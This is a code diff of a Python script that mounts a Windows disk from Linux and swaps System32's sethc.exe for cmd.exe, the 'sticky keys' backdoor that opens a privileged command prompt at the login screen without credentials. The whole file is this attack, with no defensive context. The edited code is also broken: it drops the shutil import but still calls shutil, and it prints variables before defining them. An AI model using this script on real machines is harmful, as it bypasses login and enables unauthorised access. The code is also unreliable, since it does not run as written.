@@ -1,28 +1,35 @@
 
 import sys
 import os
-import shutil
 
-username = os.getlogin()
-directory = ""
-drive_dir = "/media/" + username
-def get_dir(f):
-    root = drive_dir + "/" + f + "/windows/system32"
-    return root
+sys32 = "/rham/Windows/System32"
+
+print("Username: " + username)
+print("drive_dir: "+ drive_dir) 
+
+#mount localdisk:
+os.system("mkdir /rham")
+os.system("mount /dev/sda3 /rham")
+
+drive_dir = "/rham"
+
 files = os.listdir(drive_dir)
 
-for f in files:
-    print(f)
-    directory = get_dir(f)
-    is_windows = os.path.isdir(directory)
+for folder in files:
+    print(folder)
+    is_windows = os.path.isdir(sys32)
     if is_windows == False:
         continue
     else:
         break
 
-cmd = directory + "/cmd.exe"
-sethc = directory + "/sethc.exe"
-old_sethc = directory + "/sethc0.exe"
+cmd = sys32 + "/cmd.exe"
+sethc = sys32 + "/sethc.exe"
+old_sethc = sys32 + "/sethc0.exe"
+
+print("cmd: " +cmd)
+print("sethc: " + sethc)
+print("old sethc: " + old_sethc)
 
 os.rename(sethc, old_sethc)
 shutil.copyfile(cmd, sethc)
